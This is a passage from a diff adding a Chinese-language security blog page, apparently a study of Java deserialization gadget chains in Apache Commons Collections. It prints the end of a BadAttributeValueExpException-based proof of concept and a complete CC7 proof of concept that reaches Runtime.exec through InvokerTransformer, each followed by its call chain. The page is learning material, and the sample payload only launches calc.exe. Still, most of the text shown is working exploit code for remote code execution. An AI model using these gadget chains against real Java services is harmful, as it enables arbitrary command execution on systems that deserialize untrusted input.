+        <span class="n">Field</span> <span class="n">f</span> <span class="o">=</span> <span class="n">ChainedTransformer</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&quot;iTransformers&quot;</span><span class="p">);</span>
+        <span class="n">f</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+        <span class="n">f</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">transformerChain</span><span class="p">,</span> <span class="n">transformers</span><span class="p">);</span>
+        <span class="c1">// 使用反射替换BadAttributeValueExpException的val</span>
+        <span class="n">f</span> <span class="o">=</span> <span class="n">BadAttributeValueExpException</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&quot;val&quot;</span><span class="p">);</span>
+        <span class="n">f</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+        <span class="n">f</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">tiedMapEntry</span><span class="p">);</span>
+
+        <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="p">();</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">barr</span><span class="p">);</span>
+        <span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span>
+        <span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
+
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">barr</span><span class="p">);</span>
+        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">barr</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">()));</span>
+        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="p">(</span><span class="n">Object</span><span class="p">)</span> <span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></p>
+<h3 id="调用逻辑_4">调用逻辑<a class="headerlink" href="#调用逻辑_4" title="Permanent link">#</a></h3>
+<p>整条链的调用逻辑为:<br />
+<div class="highlight"><pre><span></span><code>BadAttributeValueExpException.readObject()
+  valObj.toString() === TiedMapEntry.toString()
+    TiedMapEntry.getValue()
+      LazyMap.get()
+         ChainedTransformer.transform()
+          ConstantTransformer.transform() // 获取Runtime.class
+          InvokerTransformer.transform()   // 获取Runtime.getRuntime
+          InvokerTransformer.transform()   // 获取Runtime实例
+          InvokerTransformer.transform()   // 调用exec方法触发rce
+</code></pre></div></p>
+<h2 id="cc7">CC7<a class="headerlink" href="#cc7" title="Permanent link">#</a></h2>
+<h3 id="入口_2">入口<a class="headerlink" href="#入口_2" title="Permanent link">#</a></h3>
+<p>CC7稍微有点复杂，利用的是<code>Hashtable.equals</code>方法去触发<code>LazyMap.get</code>。<br />
+详情分析<a href="https://xz.aliyun.com/t/10457#toc-11">通俗易懂的Java Commons Collections 5、6、7分析 - 先知社区</a></p>
+<h3 id="最终poc_1">最终poc<a class="headerlink" href="#最终poc_1" title="Permanent link">#</a></h3>
+<div class="highlight"><pre><span></span><code><span class="kn">package</span> <span class="nn">top.longlone</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayInputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Hashtable</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="p">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC7</span> <span class="p">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">fakeTransformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]</span> <span class="p">{</span><span class="k">new</span> <span class="n">ConstantTransformer</span><span class="p">(</span><span class="mi">0</span><span class="p">)};</span>
+        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span>
+                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&quot;getMethod&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span> <span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&quot;getRuntime&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">}),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&quot;invoke&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span> <span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">}),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&quot;exec&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&quot;calc.exe&quot;</span><span class="p">}),</span>
+                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
+        <span class="p">};</span>
+
+
+        <span class="n">Transformer</span> <span class="n">transformerChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">fakeTransformers</span><span class="p">);</span>
+        <span class="n">Map</span> <span class="n">innerMap1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="p">();</span>
+        <span class="n">Map</span> <span class="n">innerMap2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="p">();</span>
+
+        <span class="n">Map</span> <span class="n">lazyMap1</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">innerMap1</span><span class="p">,</span> <span class="n">transformerChain</span><span class="p">);</span>
+        <span class="n">lazyMap1</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;yy&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+
+        <span class="n">Map</span> <span class="n">lazyMap2</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">innerMap2</span><span class="p">,</span> <span class="n">transformerChain</span><span class="p">);</span>
+        <span class="n">lazyMap2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;zZ&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+
+        <span class="n">Hashtable</span> <span class="n">hashtable</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="p">();</span>
+        <span class="n">hashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">lazyMap1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="n">hashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">lazyMap2</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="n">lazyMap2</span><span class="p">.</span><span class="na">remove</span><span class="p">(</span><span class="s">&quot;yy&quot;</span><span class="p">);</span>
+
+        <span class="n">Field</span> <span class="n">f</span> <span class="o">=</span> <span class="n">ChainedTransformer</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&quot;iTransformers&quot;</span><span class="p">);</span>
+        <span class="n">f</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+        <span class="n">f</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">transformerChain</span><span class="p">,</span> <span class="n">transformers</span><span class="p">);</span>
+
+        <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="p">();</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">barr</span><span class="p">);</span>
+        <span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">hashtable</span><span class="p">);</span>
+        <span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
+
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">barr</span><span class="p">);</span>
+        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">barr</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">()));</span>
+        <span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<h3 id="调用逻辑_5">调用逻辑<a class="headerlink" href="#调用逻辑_5" title="Permanent link">#</a></h3>
+<p>整条链的调用逻辑为:<br />
+<div class="highlight"><pre><span></span><code>Hashtable.readObject()
+  Hashtable.reconstitutionPut()
+    TiedMapEntry.getValue()
+      org.apache.commons.collections.map.AbstractMapDecorator.equals() === java.util.AbstractMap.equals()
+        LazyMap.get()
+           ChainedTransformer.transform()
+            ConstantTransformer.transform() // 获取Runtime.class
+            InvokerTransformer.transform()   // 获取Runtime.getRuntime
+            InvokerTransformer.transform()   // 获取Runtime实例
+            InvokerTransformer.transform()   // 调用exec方法触发rce
+</code></pre></div></p>
+
+              
+  
+
+            </article>
+          </div>
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" data-md-state="hidden">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"/></svg>
+            回到页面顶部
+          </a>
+        
+      </main>
+      
+        
+<footer class="md-footer">
+<div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+    <div class="md-footer-copyright">
+        
+        
+    </div>
+    <div class="md-social">
+  
+    
+    
+      
+      
+    
+    <a href="https://github.com/WAY29" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+    
+    
+    <a href="mailto:toloveu29@gmail.com" target="_blank" rel="noopener" title="" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M1.75 3A1.75 1.75 0 0 0 0 4.75v14c0 .966.784 1.75 1.75 1.75h20.5A1.75 1.75 0 0 0 24 18.75v-14A1.75 1.75 0 0 0 22.25 3H1.75zM1.5 4.75a.25.25 0 0 1 .25-.25h20.5a.25.25 0 0 1 .25.25v.852l-10.36 7a.25.25 0 0 1-.28 0l-10.36-7V4.75zm0 2.662V18.75c0 .138.112.25.25.25h20.5a.25.25 0 0 0 .25-.25V7.412l-9.52 6.433c-.592.4-1.368.4-1.96 0L1.5 7.412z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://longlone.top/rss.xml" target="_blank" rel="noopener" title="longlone.top" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M3.5 3.25a.75.75 0 0 1 .75-.75C14.053 2.5 22 10.447 22 20.25a.75.75 0 0 1-1.5 0C20.5 11.275 13.225 4 4.25 4a.75.75 0 0 1-.75-.75zM3.5 19a2 2 0 1 1 4 0 2 2 0 0 1-4 0zm.75-9.5a.75.75 0 0 0 0 1.5 9.25 9.25 0 0 1 9.25 9.25.75.75 0 0 0 1.5 0C15 14.313 10.187 9.5 4.25 9.5z"/></svg>
+    </a>
+  
+</div>
+    </div>
+</div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["header.autohide", "navigation.expand", "navigation.top", "toc.integrate", "tabs"], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "search": "../../../../assets/javascripts/workers/search.22074ed6.min.js"}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.960e086b.min.js"></script>
+      
+        <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+      
+    
+  </body>
+</html>
